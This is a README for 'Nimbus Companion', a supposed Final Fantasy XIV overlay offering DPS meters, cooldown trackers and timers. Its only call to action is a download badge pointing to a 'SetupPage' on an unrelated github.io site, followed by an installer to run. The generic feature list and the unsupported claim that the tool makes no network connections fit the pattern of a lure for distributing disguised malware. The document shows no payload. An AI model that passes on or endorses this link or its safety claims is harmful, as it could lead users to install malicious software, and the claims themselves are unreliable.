# Nimbus Companion – Final Fantasy XIV

**A Windows‑only overlay that puts every essential FF14 utility right at your fingertips.**
Designed exclusively for Windows 10/11, Nimbus Companion delivers real‑time stats, countdown timers, and UI tweaks that keep you focused on the adventure, not the menu.

---

## ✨ What It Does

| Feature | Why It Matters |
|---------|----------------|
| **Live DPS / HPS Meter** | See your performance instantly without pausing. |
| **Ability Cooldown Tracker** | Never miss a critical skill again. |
| **Buff & Debuff Timeline** | Visualize status effects across the party. |
| **Customizable Mini‑Map Overlay** | Keep navigation info on screen, not in a separate window. |
| **Quest & Duty Timer** | Auto‑start timers for raids, trials, and events. |
| **Lightweight & Non‑Intrusive** | Runs in the background with minimal CPU impact. |

---

## 📦 Getting Started

1. **Download** – Click the button below to open the official Release page.
   <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download Release Page"></a>

2. **Install** – Follow the on‑screen wizard. The installer detects Windows 10/11 automatically and configures the overlay for optimal performance.

3. **Configure** – Launch Nimbus Companion, open **Settings**, and choose the modules you want active. All options are saved per‑profile.

4. **Play** – Start FF14, and the overlay will appear on top of your game window. You can toggle visibility with **Ctrl + Shift + N**.

## 🚀 Features at a Glance

- **Real‑time combat statistics** (DPS, HPS, crit rate)
- **Skill‑cooldown visualizer** with audio alerts
- **Party‑wide buff/debuff bar** that syncs across zones
- **Dynamic quest tracker** that highlights objectives automatically
- **Custom skins & layout presets** (dark, light, minimal)
- **Hot‑key support** for rapid toggling and module switching

---

## 🛠️ Technical Details

- **Platform:** Windows 10 / Windows 11 (64‑bit)
- **Framework:** .NET 6 + DirectX 11 overlay engine
- **Resource Usage:** < 30 MB RAM, < 3 % CPU on idle
- **Safety:** No external network connections; all data stays local
